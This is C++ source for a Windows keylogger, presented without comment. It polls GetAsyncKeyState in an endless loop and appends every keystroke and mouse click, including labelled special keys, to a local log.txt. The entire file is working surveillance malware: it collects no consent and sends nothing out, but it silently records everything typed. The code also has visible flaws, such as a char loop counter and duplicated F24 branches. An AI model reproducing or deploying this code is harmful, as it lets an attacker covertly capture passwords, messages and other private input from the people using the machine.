#include <iostream>
#include <Windows.h>
using namespace std;

int save(int _key, char *file);

int main(){
    char i;
    while(true){
        for(i=8;i<=255;i++){
            if (GetAsyncKeyState(i) == -32767)
            {
                save(i,"log.txt");
            }
        }
    }
}
int save(int _key,char *file){
    cout << _key << endl;
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file,"a+");
    if(_key == VK_LBUTTON            ){  fprintf(       OUTPUT_FILE,"%s", "[!Left Click!]\n"      );}
    else if(_key == VK_RBUTTON       ){  fprintf(       OUTPUT_FILE,"%s", "[!Right Click!]\n"     );}
    else if(_key == VK_BACK          ){  fprintf(       OUTPUT_FILE,"%s", "[!Back Space!]\n"      );}
    else if(_key == VK_TAB           ){  fprintf(       OUTPUT_FILE,"%s", "[!TAB!]\n"             );}
    else if(_key == VK_CLEAR         ){  fprintf(       OUTPUT_FILE,"%s", "[!Clear!]\n"           );}
    else if(_key == VK_RETURN        ){  fprintf(       OUTPUT_FILE,"%s", "\n"                    );}
    else if(_key == VK_SHIFT         ){  fprintf(       OUTPUT_FILE,"%s", "[!SHIFT!]"             );}
    else if(_key == VK_CONTROL       ){  fprintf(       OUTPUT_FILE,"%s", "[!CTL!]"               );}
    else if(_key == VK_MENU          ){  fprintf(       OUTPUT_FILE,"%s", "[!ALT!]"               );}
    else if(_key == VK_CAPITAL       ){  fprintf(       OUTPUT_FILE,"%s", "[!Caps Look!]\n"       );}
    else if(_key == VK_PRIOR         ){  fprintf(       OUTPUT_FILE,"%s", "[!Page Up!]\n"         );}
    else if(_key == VK_ESCAPE        ){  fprintf(       OUTPUT_FILE,"%s", "[!ESC!]\n"             );}
    else if(_key == VK_NEXT          ){  fprintf(       OUTPUT_FILE,"%s", "[!Page Down!]\n"       );}
    else if(_key == VK_END           ){  fprintf(       OUTPUT_FILE,"%s", "[!End!]\n"             );}
    else if(_key == VK_HOME          ){  fprintf(       OUTPUT_FILE,"%s", "[!Home!]\n"            );}
    else if(_key == VK_LEFT          ){  fprintf(       OUTPUT_FILE,"%s", "[!Left Arrow Key!]\n"  );}
    else if(_key == VK_UP            ){  fprintf(       OUTPUT_FILE,"%s", "[!Up Arrow Key!]\n"    );}
    else if(_key == VK_RIGHT         ){  fprintf(       OUTPUT_FILE,"%s", "[!RIGHT ARROW key!]\n" );}
    else if(_key == VK_DOWN          ){  fprintf(       OUTPUT_FILE,"%s", "[!DOWN ARROW key!]\n"  );}
    else if(_key == VK_PRINT         ){  fprintf(       OUTPUT_FILE,"%s", "[!PRINT key!]\n"       );}
    else if(_key == VK_DELETE        ){  fprintf(       OUTPUT_FILE,"%s", "[!DEL key!]\n"         );}
    else if(_key == VK_SLEEP         ){  fprintf(       OUTPUT_FILE,"%s", "[!Sleep!]\n"           );}
    else if(_key == VK_F1            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F1!]\n"        );}
    else if(_key == VK_F2            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F2!]\n"        );}
    else if(_key == VK_F3            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F3!]\n"        );}
    else if(_key == VK_F4            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F4!]\n"        );}
    else if(_key == VK_F5            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F5!]\n"        );}
    else if(_key == VK_F6            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F6!]\n"        );}
    else if(_key == VK_F7            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F7!]\n"        );}
    else if(_key == VK_F8            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F8!]\n"        );}
    else if(_key == VK_F9            ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F9!]\n"        );}
    else if(_key == VK_F10           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F10!]\n"       );}
    else if(_key == VK_F11           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F11!]\n"       );}
    else if(_key == VK_F12           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F12!]\n"       );}
    else if(_key == VK_F13           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F13!]\n"       );}
    else if(_key == VK_F14           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F14!]\n"       );}
    else if(_key == VK_F15           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F15!]\n"       );}
    else if(_key == VK_F16           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F16!]\n"       );}
    else if(_key == VK_F17           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F17!]\n"       );}
    else if(_key == VK_F18           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F18!]\n"       );}
    else if(_key == VK_F19           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F19!]\n"       );}
    else if(_key == VK_F20           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F20!]\n"       );}
    else if(_key == VK_F21           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F21!]\n"       );}
    else if(_key == VK_F22           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F22!]\n"       );}
    else if(_key == VK_F23           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F23!]\n"       );}
    else if(_key == VK_F24           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F24!]\n"       );}
    else if(_key == VK_NUMPAD0       ){  fprintf(       OUTPUT_FILE,"%s", "0"                     );}
    else if(_key == VK_NUMPAD1       ){  fprintf(       OUTPUT_FILE,"%s", "1"                     );}
    else if(_key == VK_NUMPAD2       ){  fprintf(       OUTPUT_FILE,"%s", "2"                     );}
    else if(_key == VK_NUMPAD3       ){  fprintf(       OUTPUT_FILE,"%s", "3"                     );}
    else if(_key == VK_NUMPAD4       ){  fprintf(       OUTPUT_FILE,"%s", "4"                     );}
    else if(_key == VK_NUMPAD5       ){  fprintf(       OUTPUT_FILE,"%s", "5"                     );}
    else if(_key == VK_NUMPAD6       ){  fprintf(       OUTPUT_FILE,"%s", "6"                     );}
    else if(_key == VK_NUMPAD7       ){  fprintf(       OUTPUT_FILE,"%s", "7"                     );}
    else if(_key == VK_NUMPAD8       ){  fprintf(       OUTPUT_FILE,"%s", "8"                     );}
    else if(_key == VK_NUMPAD9       ){  fprintf(       OUTPUT_FILE,"%s", "9"                     );}
    else if(_key == VK_LSHIFT        ){  fprintf(       OUTPUT_FILE,"%s", "[!Left Shift!]\n"      );}
    else if(_key == VK_RSHIFT        ){  fprintf(       OUTPUT_FILE,"%s", "[!Rigth Shift!]\n"     );}
    else if(_key == VK_LCONTROL      ){  fprintf(       OUTPUT_FILE,"%s", "[!Left Control!]\n"    );}
    else if(_key == VK_RCONTROL      ){  fprintf(       OUTPUT_FILE,"%s", "[!Rigth Control!]\n"   );}
    else if(_key == VK_LMENU         ){  fprintf(       OUTPUT_FILE,"%s", "[!Left Menu!]\n"       );}
    else if(_key == VK_RMENU         ){  fprintf(       OUTPUT_FILE,"%s", "[!Rigth Menu!]\n"      );}
    else if(_key == VK_F24           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F24!]\n"       );}
    else if(_key == VK_F24           ){  fprintf(       OUTPUT_FILE,"%s", "[!Click F24!]\n"       );}
    else                              {  fprintf(       OUTPUT_FILE,"%s", &_key                   );}
    
    fclose(OUTPUT_FILE);
    return 0;
}